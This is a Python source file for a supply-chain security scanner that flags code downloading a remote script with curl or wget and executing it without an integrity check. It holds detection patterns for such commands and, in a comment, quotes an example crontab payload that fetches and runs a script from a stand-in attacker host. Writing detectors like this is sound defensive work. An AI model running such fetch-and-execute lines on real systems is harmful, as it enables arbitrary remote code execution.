#!/usr/bin/env python3
"""Fetch-then-execute-remote-script detector — a swappable-source RCE surface.

A repo/skill that downloads a script from a remote URL and executes it with no
integrity check (no checksum, no signature, no version/commit pin) is running whatever
that server returns AT THAT MOMENT, with the user's privileges. The URL can serve
different bytes at any time — compromise, hijack, a malicious redirect — so a
"trusted domain today" is not a guarantee. This is the classic ``curl … | bash``
supply-chain risk, in two forms:

  PIPE  — ``curl|wget <http-url> | (sudo)? (bash|sh|python|…)``  (single line)
  SPLIT — ``curl|wget … -o FILE`` … then ``bash|sh|python FILE`` / ``./FILE``
          — including ``subprocess.run(["curl","-o",f,url])`` then
          ``subprocess.run(["bash", f])`` (list-arg, no shell=True), the exact form
          that EVADES pipe/shell detection. agent-reach's installer used this split
          form with the comment "without invoking a shell pipeline".

T3: the SPLIT form is matched by TOKENISING each command rather than by one big
regex. The original regexes required the URL to appear BEFORE the ``-o`` flag
(``curl URL -o F`` matched, ``curl -o F URL`` did not) — so the flag-first ordering
that real installers and every ``subprocess.run(["curl","-o",f,url])`` call use fell
straight through and the repo vetted SAFE. Argument order is not a security property;
a tokeniser has none. It is also inherently linear, which retires the catastrophic
backtracking that the old ``\\S++`` possessive quantifiers were papering over.

The scanner is file-level: for the split form it correlates the download TARGET
(the ``-o``/redirect/basename destination) with a LATER execute of that SAME token, so
a purely local ``bash ./scripts/build.sh`` (no remote fetch), a download that is never
run, and an execute that happens before the download are all NOT flagged. Whole-line
comments are skipped in code files just as doc files are skipped entirely — prose
quoting an install line is not the repo fetch-executing.

Severity HIGH (review, not auto-block): many legitimate installers (nvm, rustup,
homebrew) fetch-execute, so this is a "review this install path" signal — it drives the
vet verdict to CAUTION, not an automatic DO_NOT_INSTALL, and shows prominently in scan.
"""
import bisect
import re
import time
from pathlib import Path
from typing import Dict, Iterator, List, Tuple

from medusa.scanners.base import BaseScanner, ScannerIssue, ScannerResult, Severity

# Interpreters that execute a script argument.
_INTERP_NAMES = frozenset({"bash", "sh", "zsh", "ksh", "dash", "ash",
                           "ruby", "perl", "node"})
# `.` and `source` are shell builtins: they are only an execution when they START the
# command. Matched at any word position they turn `jq . "$RESPONSE"` — pretty-printing
# a file curl just downloaded — into "sources a remote script", which is how this rule
# lit up seven clean lines of llmgateway's scripts.
_INTERP_AT_START = frozenset({".", "source"})
_PY_NAME_RE = re.compile(r"^python[0-9.]*$")

# CR-036 made permanent: the PIPE form's alternation is DERIVED from the same sets the
# SPLIT form matches on, so the two cannot drift. The original bug was exactly that
# drift — the split form omitted `node`, so `node evil.js` was caught piped and missed
# split. A shared comment could not enforce this; a shared definition does.
_INTERP_ALT = "|".join(
    [re.escape(n) for n in sorted(_INTERP_NAMES | _INTERP_AT_START)] + [r"python[0-9.]*"]
)
_INTERP = r"(?:sudo\s+)?(?:" + _INTERP_ALT + r")"
_FETCH = r"(?:curl|wget)"

# PIPE form: fetch a remote URL piped straight into an interpreter.
_PIPE_RE = re.compile(
    r"(?i)\b" + _FETCH + r"\b[^\n|]*\bhttps?://[^\n|]*\|\s*" + _INTERP + r"\b"
)

# --- SPLIT form: tokenised command model ------------------------------------ #
# Quotes are blanked (not stripped) before tokenising so that byte offsets — and
# therefore line numbers — stay identical to the original file, while
# `["curl", "-o", f]` and `"curl -o f"` (a shell=True string) tokenise identically.
_QUOTE_BLANK = str.maketrans({"'": " ", '"': " "})

# One linear pass: separator | open-bracket | close-bracket | redirect | word.
# Braces stay INSIDE words so `${TMP}/x.sh` survives as a single correlatable token.
_TOK_RE = re.compile(r"(&&|\|\||[;|&\n])|([\[(])|([\])])|(>>|>)|([^\s,()\[\]|&;>]+)")

# A newline normally ends a command, except inside brackets — a Python argv list
# legitimately wraps across lines. Bounded, because quote-blanking means an unbalanced
# `(` inside a string would otherwise glue the whole rest of the file into one command
# and let an unrelated download and execute correlate.
_MAX_CONT_LINES = 4

_FETCH_NAMES = frozenset({"curl", "wget", "curl.exe", "wget.exe"})
# Words that precede the real command and must be stepped over before asking
# "is this line executing a downloaded file directly?" (`sudo ./installer.sh`).
_WRAPPERS = frozenset({"sudo", "doas", "exec", "nohup", "time", "env", "command"})
# `bash -c '…'` runs an INLINE script, so the following word is source text, not a
# file — correlating it would be nonsense. A bare `-` is the same story via stdin:
# in `python3 - "$RESPONSE_FILE" <<'PY'` the script is the heredoc and the remaining
# words are its ARGUMENTS, not the thing being executed.
_INLINE_FLAGS = frozenset({"-c", "--command", "-e", "-"})
# How far past an interpreter word we will step over flags looking for the script path.
_MAX_FLAG_SCAN = 8

# curl/wget output flags. Case matters: curl's `-o` takes a filename, curl's `-O`
# takes NONE (it saves under the URL's basename) — conflating them invents targets.
_OUT_FLAGS = frozenset({"-o", "--output", "--output-document"})
_OUT_FLAGS_EQ = ("--output=", "--output-document=")
_PREFIX_FLAGS = frozenset({"-P", "--directory-prefix"})
# `curl URL > FILE` — a shell redirect names the download target just as `-o` does.
_REDIR_TOKENS = frozenset({">", ">>"})
_CURL_REMOTE_NAME = frozenset({"-O", "--remote-name"})
# Bundled short flags: `curl -sSo file URL` / `curl -fsSLO URL` are the same request
# as `-o` / `-O` written long-hand.
_BUNDLED_O_RE = re.compile(r"^-[a-zA-Z]*o$")
_BUNDLED_CAP_O_RE = re.compile(r"^-[a-zA-Z]*O[a-zA-Z]*$")

_URL_RE = re.compile(r"^https?://", re.I)
# A correlatable target: a path/identifier, never a flag, and carrying real filename
# substance — `$` (debris from `$(mktemp)`) and `2` (from `2>&1`) are tokeniser
# residue, and correlating on them would manufacture findings from punctuation.
_TARGET_RE = re.compile(r"^[\w./$~{}+-]+$")

# A line whose FIRST non-space characters open a comment is prose about a command,
# not the command. Deliberately start-of-line only: an inline trailing `#` sits after
# real code, and `//` also lives inside every `https://`. `-` is excluded because a
# YAML CI step (`- curl … | bash`) is a real command, not a list-marker comment.
# A leading bare `*` is NOT in this set. It would buy only C block-comment
# continuation lines, and it costs two things that must never be silenced: a shell
# `case` branch (`*) curl … | bash ;;`) and a crontab payload — the corpus CVE
# `* * * * * root curl -s http://attacker.com/r.sh | bash` went dark behind it.
_COMMENT_LINE_RE = re.compile(r"\s*(?:#|//|/\*|<!--|::|rem\s)", re.I)

# Docstrings are the multi-line twin of a `#` comment and this scanner's own module
# docstring proved it — documenting `curl -o f url` … `bash f` self-flagged. Only a
# triple quote that OPENS at the start of a line is treated as a docstring: a shell
# script held in `subprocess.run("""curl … bash …""", shell=True)` or assigned as
# `SCRIPT = """…"""` opens mid-line and stays live, because that one really does run.
_TRIPLE_RE = re.compile(r'"""|\'\'\'')
_STR_PREFIX = "rubfRUBF"

# Cap the bytes we read/regex per file. A fetch-exec line lives near the top of an
# install script; 2 MiB covers any real installer while bounding the regex work on a
# pathological huge/minified file (CR-041: documented — was a bare magic number).
_MAX_BYTES = 2 * 1024 * 1024
# Documentation file types: a README mentioning `curl | bash` is install PROSE, not the
# repo actively fetch-executing — excluded to avoid flagging every tool's install docs.
_DOC_SUFFIXES = (".md", ".markdown", ".rst", ".adoc", ".txt")
_CODE_SUFFIXES = (
    ".sh", ".bash", ".zsh", ".ksh", ".py", ".js", ".mjs", ".cjs", ".ts",
    ".rb", ".pl", ".yml", ".yaml", ".dockerfile", ".ps1", ".psm1",
)
_CODE_NAMES = frozenset({"dockerfile", "makefile", "justfile"})


def _norm(tok: str) -> str:
    """Normalize a captured target token for correlation (strip quotes, leading `./`).

    `./installer.sh` and `installer.sh` are the same file; nothing else is folded —
    basename-only matching would equate `/tmp/build.sh` with `./scripts/build.sh`,
    which is exactly the variable-collision false positive this rule must avoid.
    """
    tok = (tok or "").strip().strip("'\"")
    while tok.startswith("./"):
        tok = tok[2:]
    return tok


def _base(tok: str) -> str:
    """Last path segment, lowercased — `/usr/bin/curl` invokes `curl`."""
    return tok.rsplit("/", 1)[-1].lower()


def _is_target(tok: str) -> bool:
    """True if `tok` can name a file we are willing to correlate on."""
    if not tok or tok.startswith("-") or not _TARGET_RE.match(tok):
        return False
    return any(c.isalpha() for c in tok) or "/" in tok


def _url_basename(url: str) -> str:
    """The filename `wget URL` / `curl -O URL` writes into the cwd."""
    path = url.split("://", 1)[-1].split("?", 1)[0].split("#", 1)[0]
    return path.rsplit("/", 1)[-1] if "/" in path else ""


def _blank_docstrings(text: str) -> str:
    """Blank line-start triple-quoted regions, preserving length and newlines.

    Length preservation is the whole trick: every byte offset — and therefore every
    reported line number — stays valid, so suppression costs nothing downstream.
    Delimiters are paired in order (`\"\"\"` with `\"\"\"`, `'''` with `'''`) rather than
    matched by regex, so the CLOSING quote of a mid-line string cannot be mistaken for
    an opener and blank everything up to the next docstring.
    """
    if '"""' not in text and "'''" not in text:
        return text
    spans, pos = [], 0
    while True:
        m = _TRIPLE_RE.search(text, pos)
        if not m:
            break
        delim = m.group(0)
        close = text.find(delim, m.end())
        if close == -1:
            break
        pos = close + len(delim)
        head = text[text.rfind("\n", 0, m.start()) + 1:m.start()]
        if head.strip(" \t").strip(_STR_PREFIX) == "":
            spans.append((m.start(), pos))
    if not spans:
        return text
    buf = list(text)
    for lo, hi in spans:
        for i in range(lo, hi):
            if buf[i] != "\n":
                buf[i] = " "
    return "".join(buf)


def _commands(text: str) -> Iterator[List[Tuple[str, int]]]:
    """Yield each command as [(word, offset), …].

    Commands are cut at `;`, `&&`, `||`, `|`, `&` and at a newline outside brackets —
    the separators that actually occur between a download and its execute. `|` cutting
    is deliberate: the pipe form has its own detector, and cutting there stops the
    split logic from correlating across a pipeline.
    """
    cur: List[Tuple[str, int]] = []
    depth = 0
    cont = 0
    for m in _TOK_RE.finditer(text):
        sep, opened, closed, redir, word = m.groups()
        if sep:
            if sep == "\n" and depth > 0 and cont < _MAX_CONT_LINES:
                cont += 1          # inside a wrapped argv list — same command
                continue
            if sep == "\n":
                cont = 0
                depth = 0          # resync after an unbalanced bracket in a string
            if cur:
                yield cur
                cur = []
        elif opened:
            depth += 1
        elif closed:
            depth = max(0, depth - 1)
        else:
            cur.append((redir or word, m.start()))
    if cur:
        yield cur


def _download_targets(words: List[Tuple[str, int]]) -> List[Tuple[str, int]]:
    """Files this command writes a REMOTE download into.

    No literal URL is required: `curl`/`wget` fetch over the network by definition, so
    `subprocess.run(["curl", "-o", f, url])` — URL in a variable — is a remote download
    just as much as the literal form, and arguably a worse one (the source is dynamic).
    An explicit `file://` fetch is local and is not a download.
    """
    texts = [w for w, _ in words]
    offs = [o for _, o in words]
    fetch_at = next((i for i, t in enumerate(texts) if _base(t) in _FETCH_NAMES), None)
    if fetch_at is None:
        return []
    is_wget = _base(texts[fetch_at]).startswith("wget")
    args = texts[fetch_at + 1:]
    url_i = next((i for i, t in enumerate(args) if _URL_RE.match(t)), None)
    if url_i is None and any(t.lower().startswith("file://") for t in args):
        return []

    targets: List[Tuple[str, int]] = []
    remote_name = False
    prefix = None
    i = 0
    while i < len(args):
        t = args[i]
        nxt = args[i + 1] if i + 1 < len(args) else None
        nxt_off = offs[fetch_at + 2 + i] if i + 1 < len(args) else 0
        if (t in _OUT_FLAGS or t in _REDIR_TOKENS or _BUNDLED_O_RE.match(t)
                or (is_wget and _BUNDLED_CAP_O_RE.match(t))):
            if _is_target(nxt) and not _URL_RE.match(nxt or ""):
                targets.append((nxt, nxt_off))
            i += 2
            continue
        if t.startswith(_OUT_FLAGS_EQ):
            val = t.split("=", 1)[1]
            if _is_target(val):
                targets.append((val, offs[fetch_at + 1 + i]))
            i += 1
            continue
        if not is_wget and (t in _CURL_REMOTE_NAME or _BUNDLED_CAP_O_RE.match(t)):
            remote_name = True      # curl -O takes no argument: saves as URL basename
        elif is_wget and t in _PREFIX_FLAGS and _is_target(nxt):
            prefix = nxt
            i += 2
            continue
        i += 1

    # No explicit destination: bare `wget URL` and `curl -O URL` still land a file —
    # the URL's basename, in the cwd (or under wget's -P prefix).
    if not targets and url_i is not None and (is_wget or remote_name):
        base = _url_basename(args[url_i])
        if _is_target(base):
            url_off = offs[fetch_at + 1 + url_i]
            targets.append((base, url_off))
            if prefix:
                targets.append((prefix.rstrip("/") + "/" + base, url_off))
    return targets


def _exec_targets(words: List[Tuple[str, int]]) -> List[Tuple[str, int]]:
    """Files this command executes — via an interpreter, or run directly."""
    texts = [w for w, _ in words]
    offs = [o for _, o in words]
    out: List[Tuple[str, int]] = []

    # Where the real command begins, past `sudo`/`env`/… — both the builtin check and
    # the direct-execution check below are relative to it.
    k = 0
    while k < len(texts) and _base(texts[k]) in _WRAPPERS:
        k += 1

    # `bash F` / `python F` / `. F` — and `subprocess.run(["bash", f])`, where the
    # interpreter is not the first word, so we scan every position rather than only [0].
    for i, t in enumerate(texts):
        b = _base(t)
        if b in _INTERP_AT_START:
            if i != k:
                continue        # a `.` in argument position is not the source builtin
        elif b not in _INTERP_NAMES and not _PY_NAME_RE.match(b):
            continue
        j = i + 1
        # Bounded: a real `bash`/`python` call carries a handful of flags before the
        # script path. Unbounded, this inner scan is O(n^2) on a pathological line of
        # repeated `sh -x -x …` — the same class of blow-up the old possessive-
        # quantifier regexes existed to avoid, and not worth reintroducing.
        stop = min(len(texts), i + 1 + _MAX_FLAG_SCAN)
        while j < stop and texts[j].startswith("-"):
            if texts[j] in _INLINE_FLAGS:
                j = len(texts)      # inline script, not a file — nothing to correlate
                break
            j += 1
        if j < len(texts) and _is_target(texts[j]):
            out.append((texts[j], offs[j]))

    # `chmod +x F && ./F` — the downloaded file IS the command, no interpreter word.
    # An EXPLICIT path prefix is required, which is also what a shell demands: you
    # cannot run `codecov` from the cwd, only `./codecov`. Accepting any word merely
    # CONTAINING a slash made a bare data path on its own line — a YAML list item,
    # `.mutation-health/live-ledger.json` — read as an execution.
    if k < len(texts):
        t = texts[k]
        if _is_target(t) and t.startswith(("./", "../", "/", "$", "~")):
            out.append((t, offs[k]))
    return out


class RemoteFetchExecScanner(BaseScanner):
    """Flags download-a-remote-script-then-execute-it (curl|bash and its split form)."""

    display_name = "Remote Fetch-Exec"
    description = ("Detects fetching a remote script (curl/wget) and executing it with "
                   "no integrity check — the curl|bash supply-chain risk, including the "
                   "split download-to-file then bash-file form that evades pipe detection.")

    def get_tool_name(self) -> str:
        return "python"

    def get_file_extensions(self) -> List[str]:
        # A DISPATCH HINT only. Scanner selection routes every collected file
        # through `can_scan` (ScannerRegistry.get_scanners_for_file →
        # scanner.can_scan), NOT through this suffix list — so the extensionless
        # `_CODE_NAMES` (Dockerfile/Makefile/justfile), which `can_scan` accepts,
        # ARE dispatched to this scanner even though they have no suffix here.
        # Confirmed by tests/test_remote_fetch_exec_scanner.py (CR-034).
        return list(_CODE_SUFFIXES)

    def can_scan(self, file_path: Path) -> bool:
        n = file_path.name.lower()
        if n.endswith(_DOC_SUFFIXES):
            return False
        # `_CODE_NAMES` covers extensionless build files (Dockerfile, Makefile,
        # justfile) — a `Dockerfile` with `RUN curl … | bash` is a prime target,
        # and can_scan-based dispatch reaches it (CR-034).
        return n.endswith(_CODE_SUFFIXES) or n in _CODE_NAMES

    def get_confidence_score(self, file_path: Path, content_head=None) -> int:
        # 80 = high but not certain: can_scan guarantees a code/script file, yet
        # whether it actually fetch-executes is decided by scan_file's correlation
        # (CR-041: documented — was a bare magic number). Comfortably above the
        # registry's dispatch threshold so this scanner runs on every code file.
        return 80 if self.can_scan(file_path) else 0

    def is_available(self) -> bool:
        return True

    def _line_of(self, content: str, pos: int) -> int:
        return content.count("\n", 0, pos) + 1

    def scan_file(self, file_path: Path) -> ScannerResult:
        start = time.time()
        # Defense in depth: never scan a doc/non-code file even if called directly —
        # a README's `curl | bash` install line is prose, not the repo fetch-executing.
        if not self.can_scan(file_path):
            return ScannerResult(self.name, str(file_path), [], time.time() - start, True)
        try:
            content = file_path.read_text(encoding="utf-8", errors="replace")[:_MAX_BYTES]
        except (OSError, IOError) as e:
            return ScannerResult(self.name, str(file_path), [], time.time() - start, False, str(e))

        issues: List[ScannerIssue] = []
        seen_lines = set()

        def _add(line: int, msg: str):
            if line in seen_lines:
                return
            seen_lines.add(line)
            issues.append(ScannerIssue(
                severity=Severity.HIGH,
                message=msg,
                line=line,
                rule_id="MEDUSA-RCE-FETCHEXEC-001",
                cwe_id=494,   # Download of Code Without Integrity Check
            ))

        # Line index: one bisect lookup per candidate instead of one O(n) newline
        # count, because the tokeniser produces far more candidates than findings.
        lines = content.split("\n")
        starts, acc = [], 0
        for ln in lines:
            starts.append(acc)
            acc += len(ln) + 1
        commented = [bool(_COMMENT_LINE_RE.match(ln)) for ln in lines]

        def _is_commented(pos: int) -> bool:
            return commented[bisect.bisect_right(starts, pos) - 1]

        # Docstring prose is blanked once, for BOTH forms — a module docstring that
        # documents `curl | bash` is no more executable than a `#` comment.
        live = _blank_docstrings(content)

        # PIPE form
        for m in _PIPE_RE.finditer(live):
            if _is_commented(m.start()):
                continue
            _add(self._line_of(content, m.start()),
                 "Remote script fetched and piped straight into a shell/interpreter "
                 "(curl|bash) — no integrity check; the remote URL can serve arbitrary "
                 "code executed with your privileges")

        # SPLIT form: collect remote-download targets, then match an execute of the
        # same token that happens LATER in the file. Ordering is load-bearing —
        # running a file and only afterwards downloading to that name is not
        # fetch-then-execute, and without the check it read as one.
        dl_targets: Dict[str, int] = {}
        executions: List[Tuple[str, int]] = []
        # Quotes blanked, not removed, so offsets still index into `content`; a
        # trailing `\` continuation is blanked for the same length-preserving reason.
        neutral = live.translate(_QUOTE_BLANK).replace("\\\n", "  ")
        for words in _commands(neutral):
            for tok, off in _download_targets(words):
                if _is_commented(off):
                    continue
                dl_targets.setdefault(_norm(tok), off)
            for tok, off in _exec_targets(words):
                if not _is_commented(off):
                    executions.append((_norm(tok), off))

        for tok, off in executions:
            dl_off = dl_targets.get(tok)
            if dl_off is None or off <= dl_off:
                continue
            _add(self._line_of(content, off),
                 "Executes a script previously downloaded from a remote URL "
                 f"('{tok}') with no integrity check (checksum/signature/pin) "
                 "— split curl-download-then-execute; the source can be swapped "
                 "to run arbitrary code with your privileges")

        return ScannerResult(self.name, str(file_path), issues, time.time() - start, True)
